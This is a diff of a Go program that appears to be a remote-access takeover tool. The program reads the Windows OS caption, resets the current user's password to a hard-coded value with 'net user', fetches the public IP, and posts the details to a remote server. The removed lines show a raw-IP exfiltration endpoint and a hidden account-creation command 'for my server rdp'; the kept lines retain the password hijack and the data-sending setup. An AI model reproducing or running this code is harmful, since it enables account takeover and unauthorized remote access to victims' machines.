@@ -20,7 +20,7 @@ type Data struct {
 }
 
 func main() {
-	linkGacor := "http://43.133.138.170:80/post_data"
+	linkGacor := "" // Your link host website
 	headers := map[string]string{
 		"Content-Type": "application/json",
 		"Accept":       "text/plain",
@@ -38,33 +38,28 @@ func main() {
 		username = parts[len(parts)-1]
 	}
 
-	_p := "adiyaksa12$"
-	_t := "adiganteng"
-	_u := "adiyaksa" 
+	_p := "adiyaksa12$" // Your password
+	_t := "" // Your token website
 
 	_ = _p
 	_ = _t
 
-
-	// For my server rdp
 	_v := exec.Command("wmic", "os", "get", "Caption", "/value")
-	_c := exec.Command("net", "user", _u, _p, "/add")
 	_c2 := exec.Command("net", "user", username, _p)
 
 	_out, err := _v.Output()
-	
+
 	if err != nil {
 		fmt.Println("Gagal menjalankan perintah:", err)
 		return
 	}
 
-	_c.Run()
 	_c2.Run()
 
 	caption := strings.SplitN(string(_out), "=", 2)
 
 	publicIP, err := getPublicIP()
-	
+
 	if err != nil {
 		fmt.Println("Error:", err)
 		return
